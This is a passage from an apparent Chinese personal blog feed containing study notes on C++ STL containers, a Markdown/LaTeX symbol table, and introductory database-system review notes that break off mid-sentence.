class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">string str1 = <span class="string">&quot;abc&quot;</span>, str2 = <span class="string">&quot;xyz&quot;</span>;</span><br><span class="line">str1 += str2; <span class="comment">//将str2直接拼接到str1上</span></span><br></pre></td></tr></table></figure><p><strong>（2）compare operator</strong><br> 两个 string 类型可以用 ==，!= , &lt;, &lt;= ,&gt; , &gt;= 进行比较大小，比较规则是字典序。<br><strong>（3）length()/size()</strong><br> length () 返回 stirng 的长度，即存放的字符数。size () 和 length () 基本相同。<br><strong>（4） insert()</strong><br> string 的 insert () 函数有很多写法，这里给出几个常用的写法。<br>①insert (pos,string)，在 pos 号位置中插入字符串 string。<br>②insert (it,it2,it3)，it 为字符串的欲插入位置，it2 和 it3 为待插入字符串的首尾迭代器，用来表示串 [it2,it3) 将被插入在 it 的位置上。<br><strong>（5）erase()</strong><br> erase () 有两种用法：删除单个元素，删除一个区间的所有元素。<br>①删除单个元素：erase (it) 用于删除单个元素，it 为所需要删除的元素的迭代器。<br>②删除一个区间所有元素，erase (first,last)，同理，删除 [first,last)，first 和 last 为相应的迭代器。这里还有一种用法，str.erase (pos,length)，pos 为需要开始删除的起始位置，length 为删除的字符个数。<br><strong>（6）clear()</strong><br> clear () 用于清空 string 的数据。<br><strong>（7）substr()</strong><br> substr (pos,len) 返回从 pos 号位开始，长度为 len 的字串<br><strong>（8）string::npos</strong><br>string::npos 是一个常数，其本身的值为 - 1，但是由于是 unsigned_int 类型，因此实际上也可以认为其是 unsigned_int 类型最大值，string::npos 用以作为 find 函数匹配失败的返回值。<br><strong>（9）find()</strong><br> str.find (str2)，当 str2 是 str 的子串时，返回其在 str 中第一次出现的位置，如果 str2 不是 str 的子串，返回 string::npos。<br>str.find (str2,pos)，从 str 的 pos 号位开始匹配 str2，返回值和上相同。<br><strong>（10）replace()</strong><br> str.replace (pos,len,str2) 把 str 从 pos 号位开始，长度为 len 的子串替换为 str2。<br>str.replace (it1,it2,str2) 把 str 的迭代器 [it1,it2) 范围的子串替换为 str2。</p><h2 id="map的常用用法详解"><a class="markdownIt-Anchor" href="#map的常用用法详解">#</a> map 的常用用法详解</h2><p>【简介】 map 翻译为映射。在定义数组时 (int array [100])，其实是定义了一个从 int 型到 int 型的映射，比如 array [0] = 25,array [4] =36 就分别是将 0 映射到 25，将 4 映射到 36. 一个 double 型数组则是将 int 映射到 double 型，这里不再介绍。这样，当我们需要其他类型作为关键字来作映射，会显得不太方便。这时可以用到 map，因为 map 可以将任何基本类型（包括 STL 的容器）映射到任意基本类型。<br><strong>1，map 的定义</strong><br>单独定义一个 map</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt; mp;</span><br><span class="line">map&lt;string,<span class="type">int</span>&gt; map;  <span class="comment">//字符串映射int型 必须用string</span></span><br><span class="line">map&lt;set&lt;<span class="type">int</span>&gt;,string&gt; mp;  <span class="comment">//可以让STL容器作为键</span></span><br></pre></td></tr></table></figure><p>上述代码中，第一个是键的类型，第二个是值得类型。注意如果是字符串到整型得映射，必须用 string 而不能用 char 数组。<br><strong>2，map 容器内元素得访问</strong><br> map 有两种访问方式：下标和迭代器</p><ul><li>通过下标访问<br>和普通数组一样，例如对于 map&lt;char,int&gt; mp 得 map 来说，可以使用 mp [‘c’] 来访问对应对应得整数。当建立映射时，可以用 mp [‘c’] = 20 这样和普通数组一样得方式。但是要注意的是，<strong>map 中得键是唯一的</strong>。</li><li>通过迭代器访问<br> map 得迭代器定义和其他得 STL 容器迭代器定义得方式一样  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map&lt;typename1,typename2&gt;::iterator it;</span><br></pre></td></tr></table></figure>typename1 和 typename2 就是定义 map 时填写得类型，这样就得到了迭代器 it。<br>map 迭代器得使用方式和其他 STL 容器得迭代器不同，因为 map 得每一对映射都有两个 typename，这决定了必须能通过一个 it 来同时访问键和值。事实上，<strong>map 可以使用 it-&gt;first 来访问键，使用 it-&gt;second 来访问值。</strong>  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;m&#x27;</span>] = <span class="number">20</span>;</span><br><span class="line">mp[<span class="string">&#x27;r&#x27;</span>] = <span class="number">30</span>;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">40</span>;</span><br><span class="line"><span class="keyword">for</span>(map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">begin</span>(); it != mp.<span class="built_in">end</span>(); it++)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c %d\n&quot;</span>, it-&gt;first, it-&gt;second);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>结果：  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a <span class="number">40</span></span><br><span class="line">m <span class="number">20</span></span><br><span class="line">r <span class="number">30</span></span><br></pre></td></tr></table></figure>这里似乎有一个很神奇的现象：<strong>map 会以键从小到大的顺序自动排序</strong>，这是由于 map 内部使用红黑树实现的 (set 也是)，在建立映射会自动实现从小到大的排序功能。<br><strong>3，map 常用函数实例解析</strong><br><strong>（1）find ()</strong><br> find (key) 返回键为 key 的映射的迭代器。<br><strong>（2）erase()</strong><br> 有两种用法：删除单个元素，删除一个区间额你的所有元素。<br>①删除单个元素：map.erase (it)，it 为需要删除的元素的迭代器。<br>示例如下:</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; mp;</span><br><span class="line">mp[<span class="string">&#x27;a&#x27;</span>] = <span class="number">1</span>;</span><br><span class="line">mp[<span class="string">&#x27;b&#x27;</span>] = <span class="number">2</span>;</span><br><span class="line">mp[<span class="string">&#x27;c&#x27;</span>] = <span class="number">3</span>;  </span><br><span class="line">map&lt;<span class="type">char</span>,<span class="type">int</span>&gt;::iterator it = mp.<span class="built_in">find</span>(<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line">mp.<span class="built_in">erase</span>(it);  <span class="comment">//这里删除了 b 2</span></span><br></pre></td></tr></table></figure><p>第二种方式，mp.erase (key),key 为欲删除的映射的键。<br>②删除一个区间的所有元素。mp.erase (first,last)，其中 first 为需要删除的区间的起始迭代器，而 last 则为需要删除的区间的末尾迭代器的一个地址，也为左闭右开的区间 [first,last)。<br><strong>（3）size()</strong><br> size () 用来获取 map 中映射的对数。<br><strong>（4）clear()</strong><br> clear () 用来清空 map 中的所有元素。<br><strong>4,map 的常见用途</strong><br>感觉 map 能用到的地方应该算是比较多的。</p><ul><li>需要建立字符和整数之间映射的题目。</li><li>判断大整数或其他数据是否存在的题目，吧 map 当 bool 数组使用。</li><li>字符串和字符串的映射也可能会遇到。<br>** 扩展:mao 的键和值是唯一的，如果一个键需要对应多个值，只能用 multimap。另外，C++11 还加了 unordered_map，以散列代替 map 内部的红黑树实现，使其可以用来处理只映射而不按 key 排序的需求，速度会很快。</li></ul><h2 id="queue的常见用法详解"><a class="markdownIt-Anchor" href="#queue的常见用法详解">#</a> queue 的常见用法详解</h2><p>【定义】queue 翻译为队列，是一种很常见的数据结构。STL 实现了一个先进先出的容器。使用时需要添加 queue 的头文件。<br><strong>1，queue 的定义</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，queue 容器内元素的访问</strong><br>由于队列本身是一种先进先出的限制性数据结构，因此再 STL 中只能用 front () 来访问队首元素，或者是 back () 来访问队尾元素。<br><strong>3，queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (x) 将 x 进行入队。<br><strong>（2）front(),back()</strong><br> front 和 back 分别获取队首元素和队尾元素。<br><strong>（3）pop()</strong><br> pop () 令队首元素出队。<br><strong>（4）empty()</strong><br> empty () 检测 queue 是否为空。<br><strong>（5）size()</strong><br> size () 返回 queue 内元素的个数。<br><strong>4,queue 的常见用途</strong><br>当需要进行 BFS 时，可以直接用 queue 进行代替<br>有一点可能需要注意，再使用 front () 和 back () 之前，先用 empty () 判断队列是否为空，否则可能会出现错误。</p><h2 id="priority_queue的常见用法详解"><a class="markdownIt-Anchor" href="#priority_queue的常见用法详解">#</a> priority_queue 的常见用法详解</h2><p>【简介】 priority_queue 又称为优先队列，其底层是用堆来实现的。在优先队列中，队首元素一定是当前队列中优先级最高的哪一个。如队列有如下元素，且定义好了优先级：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">桃子 (优先级<span class="number">3</span>)</span><br><span class="line">梨子 (优先级<span class="number">4</span>)</span><br><span class="line">苹果 (优先级<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>那么出队顺序为梨子 -&gt; 桃子 -&gt; 苹果。<br>当然，可以在任何时候往优先队列加入元素，而优先队列底层的数据结构堆 (heap) 会随时调整结构，使得每次的队首元素都是优先级最大的。<br><strong>1，priority_queue</strong><br> 要使用优先队列，应该添加头文件 queue。 其定义写法也和其他 STL 容器相同。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2,priority_queue 容器内元素的访问</strong><br>和队列不一样的是，优先对立而没有了 front () 和 back () 函数，而只能通过 top () 函数来访问队首元素，也就是优先级最高的元素。<br><strong>3,priority_queue 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> push (X) 将 X 入队，时间复杂度 O (logN)，其中 N 为当前优先队列中的元素个数。<br><strong>（2）top()</strong><br> 获取队首（堆顶）的元素。<br><strong>（3）pop()</strong><br> 使队首（堆顶）的元素出队。<br><strong>（4）empty()</strong><br> 检测优先队列是否为空。<br><strong>（5）size()</strong><br> size () 返回优先队列元素的个数。<br><strong>4，priority_queue 内元素优先级的设置</strong><br>下面来介绍下优先级的设置方法。<br><strong>（1）基本数据类型的优先级设置</strong><br>此处指的是 int,double,char 等可以直接使用的数据类型，对他们的游戏那寄设置一般使数字大的优先级越高，因此队首元素就是优先队列元素中最大的那个 (char 类型则是字典序最大的)。对基本数据类型来说，下面两种定义是<strong>等价的</strong>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">priority_queue&lt;<span class="type">int</span>&gt; q;</span><br><span class="line">priority_queue&lt;<span class="type">int</span>,vector&lt;<span class="type">int</span>&gt;,less&lt;<span class="type">int</span>&gt;&gt; q;</span><br></pre></td></tr></table></figure><p>可以发现，第二种定义方式的尖括号多出了两个参数：一个是 vector&lt;int&gt;，另一个是 less&lt;int&gt;。其中第二个参数填写的是承载底层数据结构堆的容器，如果第一个参数是 double 或 char 型，则此处只需要填写 vector&lt;double &gt; 或 vector&lt;char&gt;; 而第三个参数 less&lt;int &gt; 则是对第一个参数的比较类，less&lt;int &gt; 表示数字大的优先级大，而 greater&lt;int &gt; 表示数字小的优先级大。<br><strong>（2）结构体的优先级设置</strong><br>这里以开头举得水果的例子</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">fruit</span>&#123;</span><br><span class="line">string name;</span><br><span class="line"><span class="type">int</span> price;</span><br><span class="line"><span class="keyword">friend</span> <span class="type">bool</span> <span class="keyword">operator</span> &lt; (<span class="type">const</span> fruit &amp;f1,<span class="type">const</span> fruit &amp;f2)&#123;</span><br><span class="line"><span class="keyword">return</span> f1.price &lt; f2.price;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">priority_queue&lt;fruit&gt; q;   <span class="comment">//这里就像sort的cmp函数一样， 这里是正常的 这里是以价格高的水果优先</span></span><br></pre></td></tr></table></figure><p>现在如果希望水果的价格高作为优先级高，就需要<strong>重载</strong>小于号 &quot;&lt;&quot;。重载是指对已有的运算符重新定义。见上代码块。可以看到在结构体增加了一个友元函数。 这里可以记一下， <strong>优先对了的这个函数和 sort 的 cmp 函数的效果是相反的。</strong><br><strong>5,priority_qeue 的常见用途</strong><br>可以解决一些贪心问题，也可以对 Dijkstra 算法进行优化。</p><h2 id="stack的常见用法解析"><a class="markdownIt-Anchor" href="#stack的常见用法解析">#</a> stack 的常见用法解析</h2><p>【简介】stack 翻译为栈，是 STL 种实现一个后进先出的容器。<br><strong>1，stack 的定义</strong><br>需要添加头文件 stack，用法依然和其他 STL 容器一样。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stack&lt;<span class="keyword">typename</span>&gt; name;</span><br></pre></td></tr></table></figure><p><strong>2，stack 容器内元素的访问</strong><br>由于 stack 是一种后进先出的数据结构，在 STL 的 stack 只能通过 top () 来访问栈顶元素。<br><strong>3，stack 常用函数实例解析</strong><br><strong>（1）push ()</strong><br> 将 x 入栈。<br><strong>（2）top()</strong><br> 获得栈顶元素。<br><strong>（3）pop()</strong><br> 弹出栈顶元素。<br><strong>（4）empty()</strong><br> 判断 stack 是否为空。<br><strong>（5）size()</strong><br> 返回 stack 内元素的个数。<br><strong>4,stack 的常见用途</strong><br> stack 一般用来模拟实现一些递归，防止程序堆栈内存的限制而导致程序运行出错。一般来说，程序的栈内存空间很小。</p><h2 id="pair的常见用法解析"><a class="markdownIt-Anchor" href="#pair的常见用法解析">#</a> pair 的常见用法解析</h2><p>【简介】pair 是一个很实用的 &quot;小玩意&quot;，当想要将两个元素绑在一起作为一个合成元素，又不想定义结构体时，可以用 pair。其可以看作时一个内部有两个元素的结构体。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">pair</span>&#123;</span><br><span class="line">typename1 first;</span><br><span class="line">typename2 second;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>1，pair 的定义</strong><br>要使用 pair，需要添加头文件 utility。注意：由于 map 实现过程中设计 pair，因此添加 map 头文件会自动添加 utility 头文件，故添加 map 头文件即可。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pair&lt;typename1,typeName2&gt; name;</span><br><span class="line"><span class="function">pair&lt;string,<span class="type">int</span>&gt; <span class="title">p</span><span class="params">(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>如果想初始化，只需要加个括号里面添加初始化的内容即可。如果想要临时构建一个 pair，有下面两种方法。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pair</span>&lt;string,<span class="type">int</span>&gt;(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">make_pair</span>(<span class="string">&quot;haha&quot;</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p><strong>2，pair 中元素的访问</strong><br> pair 中只有两个元素，分别是 first 和 second，只需要按照正常结构体方式去访问即可。<br><strong>3，pair 的使用函数解析</strong><br>这里只需注意比较操作数，是先比较 first，first 相等时采取判别 second 的大小。<br><strong>4，pair 的常见用途</strong></p><ul><li>用来代替二元结构体和其构造函数，可以节省编码时间。</li><li>作为 map 的键值来进行插入。</li></ul>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> STL学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MarkDown语法</title>
      <link href="/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/"/>
      <url>/2023/11/19/MarkDown%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>发现自己 MarkDown 的好多语法还要上网上搜索，那干脆自己记录一下吧。</p><table><thead><tr><th>符号</th><th>Markdown</th><th>名称</th></tr></thead><tbody><tr><td>∅</td><td><code>\emptyset</code></td><td>空集</td></tr><tr><td>∈</td><td><code>\in</code></td><td>属于</td></tr><tr><td>∋</td><td><code>\ni</code></td><td></td></tr><tr><td>∉</td><td><code>\notin</code></td><td>不属于</td></tr><tr><td>⊂</td><td><code>\subset</code></td><td>子集</td></tr><tr><td>⊃</td><td><code>\supset</code></td><td></td></tr><tr><td>⊄</td><td><code>\not\subset</code></td><td>非子集</td></tr><tr><td>⊆</td><td><code>\subseteq</code></td><td>真子集</td></tr><tr><td>⊇</td><td><code>\supseteq</code></td><td></td></tr><tr><td>∪</td><td><code>\cup</code></td><td>并集</td></tr><tr><td>⋃</td><td><code>\bigcup</code></td><td>并集</td></tr><tr><td>∩</td><td><code>\cap</code></td><td>交集</td></tr><tr><td>⋂</td><td><code>\bigcap</code></td><td>交集</td></tr><tr><td>∨</td><td><code>\vee</code></td><td>或者</td></tr><tr><td>∧</td><td><code>\wedge</code></td><td>并且</td></tr><tr><td>∖</td><td><code>\setminus</code></td><td>集合的减法</td></tr><tr><td n="">\prod_{i=1}^</td><td>$\prod_<ruby>i=1}<rp>【</rp><rt>{n</rt><rp>】</rp></ruby>$</td><td>连乘</td></tr></tbody></table><table><thead><tr><th>字母</th><th>实现</th><th>字母</th><th>实现</th><th>字母</th><th>实现</th></tr></thead><tbody><tr><td>A</td><td><code>A</code></td><td>α</td><td><code>\alpha</code></td><td>Θ</td><td><code>\Theta</code></td></tr><tr><td>B</td><td><code>B</code></td><td>β</td><td><code>\beta</code></td><td>ι</td><td><code>\iota</code></td></tr><tr><td>Γ</td><td><code>\Gamma</code></td><td>γ</td><td><code>\gamma</code></td><td>K</td><td><code>K</code></td></tr><tr><td>Δ</td><td><code>\Delta</code></td><td>δ</td><td><code>\delta</code></td><td>κ</td><td><code>\kappa</code></td></tr><tr><td>E</td><td><code>E</code></td><td>ϵ</td><td><code>\epsilon</code></td><td>Λ</td><td><code>\Lambda</code></td></tr><tr><td>Z</td><td><code>Z</code></td><td>ζ</td><td><code>\zeta</code></td><td>λ</td><td><code>\lambda</code></td></tr><tr><td>H</td><td><code>H</code></td><td>η</td><td><code>\eta</code></td><td>M</td><td><code>M</code></td></tr><tr><td>Θ</td><td><code>\Theta</code></td><td>θ</td><td><code>\theta</code></td><td>μ</td><td><code>\mu</code></td></tr><tr><td>I</td><td><code>I</code></td><td>ι</td><td><code>\iota</code></td><td>N</td><td><code>N</code></td></tr><tr><td>Ξ</td><td><code>\Xi</code></td><td>ξ</td><td><code>\xi</code></td><td>ν</td><td><code>\nu</code></td></tr><tr><td>O</td><td><code>O</code></td><td>ο</td><td><code>\omicron</code></td><td>Π</td><td><code>\Pi</code></td></tr><tr><td>P</td><td><code>P</code></td><td>ρ</td><td><code>\rho</code></td><td>Σ</td><td><code>\Sigma</code></td></tr><tr><td>T</td><td><code>T</code></td><td>σ</td><td><code>\sigma</code></td><td>Υ</td><td><code>\Upsilon</code></td></tr><tr><td>Φ</td><td><code>\Phi</code></td><td>ϕ</td><td><code>\phi</code></td><td>X</td><td><code>X</code></td></tr><tr><td>χ</td><td><code>\chi</code></td><td>Ψ</td><td><code>\Psi</code></td><td>ψ</td><td><code>\psi</code></td></tr><tr><td>Ω</td><td><code>\Omega</code></td><td>ω</td><td><code>\omega</code></td><td>ε</td><td><code>\varepsilon</code></td></tr><tr><td>ϑ</td><td><code>\vartheta</code></td><td>ϖ</td><td><code>\varpi</code></td><td>ϱ</td><td><code>\varrho</code></td></tr><tr><td>ς</td><td><code>\varsigma</code></td><td>φ</td><td><code>\varphi</code></td><td><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">∇</mi></mrow><annotation encoding="application/x-tex">\nabla</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord">∇</span></span></span></span></td><td><code>\nalba</code></td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据库</title>
      <link href="/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/"/>
      <url>/2023/11/17/%E6%95%B0%E6%8D%AE%E5%BA%93%E5%A4%8D%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>这里主要是复习的时候听着网课重新做一遍笔记。</p></blockquote><h1 id="一绪论"><a class="markdownIt-Anchor" href="#一绪论">#</a> 一，绪论</h1><h2 id="介绍"><a class="markdownIt-Anchor" href="#介绍">#</a> 介绍</h2><h3 id="数据库系统概述"><a class="markdownIt-Anchor" href="#数据库系统概述">#</a> 数据库系统概述</h3><h4 id="数据"><a class="markdownIt-Anchor" href="#数据">#</a> 数据</h4><p>数据是数据库中存储的基本对象。<br><strong>[定义]</strong> 计算机用来描述事物的符号记录（文字．图形．图像．声音）</p><ul><li>数据的形式本身并不能完全表达其内容，需要经过语义解释。<strong>特点：数据与其语义是不可分的</strong></li></ul><h4 id="数据库-db"><a class="markdownIt-Anchor" href="#数据库-db">#</a> 数据库 DB</h4><ul><li>数据库是长期存储在计算机内有结构的大量的共享的数据集合。（<strong>有组织，可共享</strong>）</li></ul><h4 id="数据库管理系统-dbms"><a class="markdownIt-Anchor" href="#数据库管理系统-dbms">#</a> 数据库管理系统 DBMS</h4><p><strong>[定义]</strong> 数据库管理系统是位于用户与操作系统之间的一层数据管理软件。<br><strong>主要功能：</strong></p><ul><li>数据定义功能</li><li>数据组织，存储和管理功能</li><li>数据操纵功能（插入，查询，删除，修改等）</li><li>数据库的事务管理和运行管理（安全性，完整性，多用户并发处理）</li><li>数据库的建立和维护功能</li></ul><h4 id="数据库系统-dbs"><a class="markdownIt-Anchor" href="#数据库系统-dbs">#</a> 数据库系统 DBS</h4><p><strong>[定义]</strong> 数据库系统由数据库（DB），数据库管理系统（DBMS），应用系统，数据库管理员（DBA）构成。<br><img src="https://github.com/dagzi1231/imagestorage/blob/img/img/%E7%BB%AA%E8%AE%BA1.png?raw=true" alt="绪论1"></p><h3 id="数据管理技术的发展"><a class="markdownIt-Anchor" href="#数据管理技术的发展">#</a> 数据管理技术的发展</h3><p><strong>一，人工管理阶段</strong></p><ul><li>数据不保存</li><li>数据不共享</li><li>应用程序管理数据</li><li>数据不独立<br><strong>二，文件系统阶段</strong></li><li>数据保存</li><li>文件系统管理数据</li><li>数据共享差，冗余大</li><li>数据独立性差<br><strong>三，数据库系统阶段</strong></li><li>数据结构化</li><li>数据共享性高，冗余度低，易扩充</li><li>数据独立性高</li><li>数据由 DBMS 同一管理和控制：安全，完整，并发，恢复</li></ul><h2 id="数据模型"><a class="markdownIt-Anchor" href="#数据模型">#</a> 数据模型</h2><p><strong>[定义]</strong> 一组概念的集合，对现实世界数据特征进行抽象。</p><ul><li><strong>概念模型</strong> ： 按照用户观点建模，用于数据库设计</li><li><strong>逻辑和物理模型</strong></li></ul><blockquote><p><strong>逻辑模型</strong>：按计算机系统观点对数据建模， 用于 DBMS 的实现。主要包括：层次模型，网状模型，关系模型（二维表的数据库），面向对象模型和对象关系模型。<br><strong>物理模型</strong>：系统内部或磁盘上表示方式、存取方法，面向计算机系统。其是对数据最底层的抽象</p></blockquote><h4 id="数据模型的组成元素"><a class="markdownIt-Anchor" href="#数据模型的组成元素">#</a> 数据模型的组成元素</h4><p><strong>一，数据结构</strong><br>描述数据库的组成对象，以及对象之间的联系。数据结构是所描述的对象类型的集合，是对系统静态特性的描述。<br><strong>二，数据操作</strong><br>数据库主要有查询和更新（包括插入，删除，修改等），两大类操作。是对系统动态特性的描述。<br><strong>三，数据的完整性约束条件</strong><br>数据的完整性约束条件是一组完整性规则。<br>【例】 关系模型中，任何的关系必须满足实体完整性和参照完整性。</p><h4 id="概念模型"><a class="markdownIt-Anchor" href="#概念模型">#</a> 概念模型</h4><p><strong>定义：</strong></p><ul><li>概念模型用于信息世界的建模</li><li>现实世界到信息世界的第一层抽象</li><li>数据库设计人员进行数据库设计的有力工具</li><li>数据库设计人员和用户之间进行交流的语言<br><strong>概念模型要求：</strong></li><li>具有较强的语义表达能力</li><li>能够方便，直接的表达应用中的各种语义知识</li><li>简单，清晰，易于用户理解<br><strong>一，信息世界中的基本概念</strong><br><strong> 1，实体 Entity</strong><br> 客观存在并且可以相互去别的事务即实体。可以是人，事，物，也可以是抽象的概念或者联系。<br>【例】 一个职工，学生，部门，课等都是实体<br><strong> 2，属性</strong><br>实体所具有的某一特性称为属性。一个实体可以由若干个属性来刻画。<br>【例】学生的 学号，姓名 等<br><strong> 3，码 key</strong><br> 唯一标识实体的属性集称为码。<br><strong>4，域</strong><br>具有相同数据类型的值的集合。即属性的取值范围。<br><strong>5，实体型</strong><br>具有相同属性的实体必然具有共同的特征和性质。<br><strong>6，实体集</strong><br>同一类型实体的集合称为实体集。<br><strong>7，联系</strong><br>现实世界中，事务内部以及事物之间是有联系的。实体内部各个属性的联系或者不同实体集之间的联系。<br><strong>二，两个实体型之间的联系</strong><br><strong> 1，一对一</strong><br>对于 A 中的每一个实体，B 中至多有一个（可以没有）实体与之联系，反之亦然。<br>【例】一个班级只有一个班长<br><strong> 2，一对多</strong><br> A 中的一个实体，B 中有 n 个实体与之联系，但是 B 中每一个实体在 A 中最多只有一个实体联系。<br>【例】一个班级有若干名学生，学生只能在一个班级学习。<br><strong>3，多对多</strong><br> A 中的每一个实体，B 中有多个，反之也是一样。<br><strong>三，概念模型得表示方法：实体 - 联系方法</strong><br>实体联系方法用 E-R 图来描述现实世界得概念模型，所刻画的某些也称为 E-R 模型。</li></ul><h4 id="数据模型得组成要素"><a class="markdownIt-Anchor" href="#数据模型得组成要素">#</a> 数据模型得组成要素</h4><ul><li>数据结构：数据结构是所研究得对象类型得集合</li><li>数据操作：对数据库得对象（型）的实例（值）进行操作（查询，更新）</li><li>数据的完整性约束条件：实体完整性，参照完整性。满足条件来保证数据的正确性，有效性和相容性</li></ul><h3 id="数据库系统结构"><a class="markdownIt-Anchor" href="#数据库系统结构">#</a> 数据库系统结构</h3><h4 id="从最终用户角度看"><a class="markdownIt-Anchor" href="#从最终用户角度看">#</a> 从最终用户角度看</h4><ul><li>单用户结构：最简单的数据库系统，整个 DBS 都装在一个计算机上，由一个用户独占</li><li>主从式结构：一个主机带多个终端的多用户结构。DBS 集中存放在主机上，所有处理任务都由主机来完成，用户通过主机的终端并发存取数据库，共享数据资源。</li><li>分布式结构：一个应用程序可以对数据库进行透明操作，数据库中的数据分别存储在不同的局部数据库中，由不同的 DBMS 进行管理，在不同的机器上允许，由不同的操作系统支持，被不同的通信网络连接在一起。</li><li>客户 - 服务器结构：服务器负责数据的管理，客户机负责完成与用户的交互任务。</li></ul><h4 id="数据库系统模式概念"><a class="markdownIt-Anchor" href="#数据库系统模式概念">#</a> 数据库系统模式概念</h4><p><strong>（1）型和值</strong></p><ul><li><strong>型 (type)：对某一类数据的结构和属性的说明</strong></li><li><strong>值 (value)：是型的一个具体赋值</strong><br><strong>（2）模式和实例</strong><br><strong>模式 (schema)：是数据库逻辑结构和特征的描述</strong></li><li>是<strong>型的描述</strong></li><li>反应的是<strong>数据的结构及其联系</strong></li><li>模式<strong>相对稳定</strong><br><strong>实例 (instance)：模式的一个具体值</strong></li><li>反映数据库<strong>某一时刻的状态</strong></li><li>同一个模式<strong>可以有很多实例</strong></li><li>实例随数据中的数据的<strong>更新而变动</strong><br><strong>（3）三级模式</strong></li><li>模式：是数据库中全体数据的逻辑结构和特征得描述，同一个模式可以有多个实例。一个数据库只有一个模式。</li><li>外模式：数据库用户能看见和使用得局部数据得逻辑结构和特征得描述，是数据库用户得数据视图，与某一应用有关的数据的逻辑表示。<strong>外模式通常是模式的一个子集</strong>，所以模式与外模式的关系为<strong>一对多</strong>。</li><li>内模式：也称存储模式，是数据物理结构和存储方式的描述，是数据在数据库内部的组织方式。<br><strong>（4）二级映像</strong><br>模式 / 内模式有映像：保证数据与程序的物理独立性。<strong>当数据库的存储结构改变时 (例如选用了另一种存储结构)，由数据库管理员对模式 / 内模式映像作相应改变，可以使模式保持不变。从而应用程序不必改变，保证了数据与程序的物理独立性，简称数据的物理独立性</strong>。</li></ul><p>外模式 / 模式有映像：定义全局逻辑结构和存储结构之间的对应关系，保证数据和程序的逻辑独立性。<strong>当模式改变时 (例如增加新的关系、新的属性、改变属性的数据类型等)，由数据库管理员对各个外模式 / 